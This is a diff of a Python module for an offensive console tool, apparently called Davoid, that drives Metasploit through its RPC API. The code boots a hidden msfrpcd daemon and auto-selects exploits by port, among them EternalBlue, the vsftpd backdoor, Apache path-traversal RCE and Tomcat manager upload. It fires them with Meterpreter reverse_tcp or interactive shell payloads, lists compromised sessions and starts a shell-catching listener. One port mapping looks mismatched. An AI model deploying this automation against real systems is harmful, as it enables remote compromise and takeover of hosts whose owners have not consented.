@@ -1,61 +1,96 @@
 import os
+import time
 import subprocess
+import socket
+import string
+import random
 import questionary
 from rich.console import Console
+from rich.table import Table
 from rich.panel import Panel
 from core.ui import draw_header, Q_STYLE
 from core.context import ctx
+from core.database import db
+
+try:
+    from pymetasploit3.msfrpc import MsfRpcClient
+except ImportError:
+    pass
 
 console = Console()
 
 
-class MetasploitEngine:
+class MetasploitRPCEngine:
     def __init__(self):
-        # Locate msfconsole on the system
-        common_paths = [
-            "/opt/metasploit-framework/bin/msfconsole",  # Official Omnibus installer
-            # Apple Silicon Mac (Homebrew)
-            "/opt/homebrew/bin/msfconsole",
-            # Intel Mac (Homebrew) / Manual
-            "/usr/local/bin/msfconsole",
-            "/usr/bin/msfconsole"                       # Kali Linux default
-        ]
+        self.client = None
+        self.daemon_process = None
+        # Generate a random 16-character password on the fly for the local API
+        self.password = ''.join(random.choices(
+            string.ascii_letters + string.digits, k=16))
+        self.rpc_port = 55554  # Custom port to avoid conflicts with other MSF instances
 
-        self.msf_path = ""
-
-        # 1. First try the standard 'which' command
+    def check_dependencies(self):
         try:
-            path = subprocess.run(['which', 'msfconsole'],
-                                  capture_output=True, text=True).stdout.strip()
-            if os.path.exists(path):
-                self.msf_path = path
-        except:
-            pass
-
-        # 2. If 'which' fails (very common under macOS sudo), check absolute paths
-        if not self.msf_path:
-            for p in common_paths:
-                if os.path.exists(p):
-                    self.msf_path = p
-                    break
-
-    def check_installed(self):
-        if not self.msf_path or not os.path.exists(self.msf_path):
+            import pymetasploit3
+            return True
+        except ImportError:
             console.print(
-                "[bold red][!] Metasploit Framework not found![/bold red]")
-            console.print("[yellow]Please install Metasploit: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall[/yellow]")
+                "[bold red][!] Critical Dependency Missing: 'pymetasploit3'[/bold red]")
             return False
-        return True
 
-    def interactive_console(self):
-        console.print(
-            "[bold green][+] Hooking into Interactive Metasploit Console...[/bold green]")
-        console.print("[dim]Type 'exit' to return to Davoid.[/dim]\n")
-        # Launch MSF directly in the current terminal session
-        subprocess.run([self.msf_path])
+    def is_port_open(self, port):
+        """Checks if a local port is listening."""
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            return s.connect_ex(('127.0.0.1', port)) == 0
+
+    def start_daemon(self):
+        """Silently boots the Metasploit RPC server in the background."""
+        if self.is_port_open(self.rpc_port):
+            # Kill any ghost instances from a previous crash
+            os.system(f"fuser -k {self.rpc_port}/tcp > /dev/null 2>&1")
+            time.sleep(1)
+
+        with console.status("[bold cyan]Booting Headless Metasploit Engine (This takes ~10 seconds)...[/bold cyan]", spinner="bouncingBar"):
+            cmd = ["msfrpcd", "-P", self.password, "-n", "-f",
+                   "-a", "127.0.0.1", "-p", str(self.rpc_port)]
+            # Launch in background and hide output
+            self.daemon_process = subprocess.Popen(
+                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+            # Wait for the daemon to finish initializing
+            for _ in range(40):
+                if self.is_port_open(self.rpc_port):
+                    time.sleep(2)  # Give it an extra 2 seconds to load modules
+                    return True
+                time.sleep(1)
+
+        return False
+
+    def connect_rpc(self):
+        """Connects Davoid to the newly spawned MSF Daemon."""
+        if self.client:
+            return True
+
+        if not self.start_daemon():
+            console.print(
+                "[bold red][!] Failed to boot Metasploit Daemon. Ensure Metasploit is installed.[/bold red]")
+            return False
+
+        console.print("[*] Negotiating API connection...")
+        try:
+            self.client = MsfRpcClient(
+                self.password, server='127.0.0.1', port=self.rpc_port, ssl=True)
+            console.print(
+                "[bold green][+] MSF-RPC Authenticated Successfully![/bold green]")
+            time.sleep(1)
+            return True
+        except Exception as e:
+            console.print(
+                f"[bold red][!] RPC Connection Failed:[/bold red] {e}")
+            return False
 
     def auto_exploit(self):
-        # Pull default IPs from Davoid's global context
+        """Silently configures and launches an exploit via API."""
         default_rhost = ctx.get("RHOST") or "192.168.1.1"
         default_lhost = ctx.get("LHOST") or "127.0.0.1"
 
@@ -64,131 +99,143 @@ class MetasploitEngine:
         if not target:
             return
 
-        # --- NEW DYNAMIC PORT LOGIC ---
         rport_input = questionary.text(
-            "Target Port (RPORT) found on scan:", style=Q_STYLE).ask()
+            "Target Port (RPORT):", style=Q_STYLE).ask()
         if not rport_input:
             return
-
-        try:
-            rport = int(rport_input)
-        except ValueError:
-            console.print(
-                "[red]Invalid port number. Please enter a number.[/red]")
-            return
+        rport = int(rport_input)
 
         lhost = questionary.text(
             "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
-        if not lhost:
-            return
 
-        # Map common ports to their top Metasploit modules
         port_exploits = {
-            21: [
-                "exploit/unix/ftp/vsftpd_234_backdoor (vsFTPd 2.3.4)",
-                "exploit/unix/ftp/proftpd_133c_backdoor (ProFTPD 1.3.3c)"
-            ],
-            22: [
-                "auxiliary/scanner/ssh/ssh_login (SSH Brute Force)",
-                "auxiliary/scanner/ssh/libssh_auth_bypass (libssh Auth Bypass)"
-            ],
-            80: [
-                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
-                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
-            ],
-            443: [
-                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
-                "exploit/multi/http/apache_normalize_path_rce (Apache 2.4.49 RCE)"
-            ],
-            139: [
-                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)"
-            ],
-            445: [
-                "exploit/windows/smb/ms17_010_eternalblue (Windows SMB MS17-010)",
-                "exploit/windows/smb/psexec (PsExec Authenticated)"
-            ],
-            8080: [
-                "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)",
-                "exploit/multi/http/tomcat_mgr_upload (Tomcat Manager Upload)"
-            ]
+            21: "unix/ftp/vsftpd_234_backdoor",
+            22: "linux/ssh/exim_pe_injection",
+            80: "multi/http/apache_normalize_path_rce",
+            445: "windows/smb/ms17_010_eternalblue",
+            8080: "multi/http/tomcat_mgr_upload"
         }
 
-        # If the port is in our dictionary, show those options.
-        # If not, provide a generic fallback.
-        choices = port_exploits.get(rport, [
-            "exploit/multi/handler (Generic Listener - Port not specifically mapped)"
-        ])
-
-        # Always add the option to search Metasploit manually for this specific port
-        search_option = f"Search Metasploit for all exploits on port {rport}..."
-        choices.append(search_option)
-
-        module = questionary.select(
-            f"Select Exploit Module for Port {rport}:", choices=choices, style=Q_STYLE).ask()
-
-        if not module:
+        module_name = port_exploits.get(rport, "multi/handler")
+        custom_mod = questionary.text(
+            f"Exploit Module (Default: {module_name}):", default=module_name, style=Q_STYLE).ask()
+        if not custom_mod:
             return
 
-        # Handle the dynamic search fallback
-        if module == search_option:
-            console.print(
-                f"[*] Dropping to MSF to search for port {rport} exploits...")
-            # Automatically run the search command inside MSF
-            msf_cmd = f"search port:{rport}"
-            subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
-            return
-
-        # Clean up the module string to just grab the path
-        clean_module = module.split()[0]
-
-        # Determine payload based on exploit
         payload = "windows/x64/meterpreter/reverse_tcp"
-        if "multi/handler" in clean_module:
-            payload = questionary.text("Listener Payload (e.g. linux/x64/meterpreter/reverse_tcp):",
-                                       default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
-        elif "unix" in clean_module or "ssh" in clean_module or "apache" in clean_module:
+        if "unix" in custom_mod or "linux" in custom_mod or "apache" in custom_mod:
             payload = "cmd/unix/interact"
 
-        # Build the automated MSF command
-        msf_cmd = f"use {clean_module}; set RHOSTS {target}; set RPORT {rport}; set LHOST {lhost}; set PAYLOAD {payload}; exploit"
+        custom_payload = questionary.text(
+            f"Payload (Default: {payload}):", default=payload, style=Q_STYLE).ask()
 
         console.print(Panel(
-            f"[bold cyan]Deploying Exploit...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {clean_module}", border_style="red"))
+            f"[bold cyan]Deploying Exploit via API...[/bold cyan]\n[white]Target:[/white] {target}:{rport}\n[white]Module:[/white] {custom_mod}", border_style="red"))
 
-        # Run msfconsole silently passing the command array
-        subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
+        try:
+            exploit = self.client.modules.use('exploit', custom_mod)
+            exploit['RHOSTS'] = target
+            exploit['RPORT'] = rport
+
+            payload_opts = {'LHOST': lhost, 'LPORT': 4444}
+            job = exploit.execute(payload=custom_payload, **payload_opts)
+
+            if job['job_id'] is not None:
+                console.print(
+                    f"[bold green][+] Exploit launched successfully (Job ID: {job['job_id']})[/bold green]")
+                db.log("MSF-Engine", target,
+                       f"Launched {custom_mod} via RPC", "HIGH")
+            else:
+                console.print(
+                    "[yellow][!] Exploit ran, but no background job was created.[/yellow]")
+        except Exception as e:
+            console.print(
+                f"[bold red][!] Exploit execution failed:[/bold red] {e}")
+
+    def list_sessions(self):
+        """Pulls live session data from the Metasploit Daemon."""
+        sessions = self.client.sessions.list
+
+        if not sessions:
+            console.print("[yellow][!] No active MSF sessions found.[/yellow]")
+            return
+
+        table = Table(title="Active MSF Sessions (RPC)", border_style="green")
+        table.add_column("Session ID", style="cyan")
+        table.add_column("Type", style="magenta")
+        table.add_column("Target IP", style="white")
+        table.add_column("Details", style="dim")
+
+        for session_id, data in sessions.items():
+            table.add_row(
+                str(session_id),
+                data.get('type', 'Unknown'),
+                data.get('target_host', 'Unknown'),
+                data.get('info', 'No Info')
+            )
+
+        console.print(table)
+
+    def cleanup(self):
+        """Kills the background daemon when leaving the module."""
+        if self.daemon_process:
+            console.print(
+                "[dim][*] Shutting down background Metasploit Daemon...[/dim]")
+            self.daemon_process.terminate()
 
     def run(self):
-        draw_header("Metasploit Integration Engine")
+        draw_header("Metasploit RPC Orchestrator")
 
-        if not self.check_installed():
+        if not self.check_dependencies():
             questionary.press_any_key_to_continue(style=Q_STYLE).ask()
             return
 
-        while True:
-            choice = questionary.select("Metasploit Operations:", choices=[
-                "1. Auto-Exploit Target (Guided)",
-                "2. Multi/Handler Listener (Catch Shells)",
-                "3. Interactive MSF Console",
-                "Back"
-            ], style=Q_STYLE).ask()
+        if not self.connect_rpc():
+            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+            return
 
-            if not choice or choice == "Back":
-                break
-            elif "Auto-Exploit" in choice:
-                self.auto_exploit()
-            elif "Handler" in choice:
-                lhost = ctx.get("LHOST") or "0.0.0.0"
-                lport = questionary.text(
-                    "LPORT:", default="4444", style=Q_STYLE).ask()
-                payload = questionary.text(
-                    "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
-                msf_cmd = f"use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}; exploit -j"
-                subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
-            elif "Interactive" in choice:
-                self.interactive_console()
+        try:
+            while True:
+                choice = questionary.select(
+                    "MSF-RPC Operations:",
+                    choices=[
+                        "1. Auto-Exploit Target (Background Job)",
+                        "2. List Active Sessions",
+                        "3. Start Generic Catch-All Listener (Multi/Handler)",
+                        "Back"
+                    ], style=Q_STYLE
+                ).ask()
+
+                if not choice or choice == "Back":
+                    break
+                elif "Auto-Exploit" in choice:
+                    self.auto_exploit()
+                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                elif "List Active" in choice:
+                    self.list_sessions()
+                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+                elif "Listener" in choice:
+                    lhost = ctx.get("LHOST") or "0.0.0.0"
+                    lport = questionary.text(
+                        "LPORT:", default="4444", style=Q_STYLE).ask()
+                    payload = questionary.text(
+                        "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
+
+                    try:
+                        exploit = self.client.modules.use(
+                            'exploit', 'multi/handler')
+                        job = exploit.execute(
+                            payload=payload, LHOST=lhost, LPORT=int(lport))
+                        console.print(
+                            f"[bold green][+] Listener started in background (Job ID: {job['job_id']})[/bold green]")
+                    except Exception as e:
+                        console.print(
+                            f"[red][!] Failed to start listener: {e}[/red]")
+                    questionary.press_any_key_to_continue(style=Q_STYLE).ask()
+        finally:
+            self.cleanup()
 
 
 def run_msf():
-    engine = MetasploitEngine()
+    engine = MetasploitRPCEngine()
     engine.run()
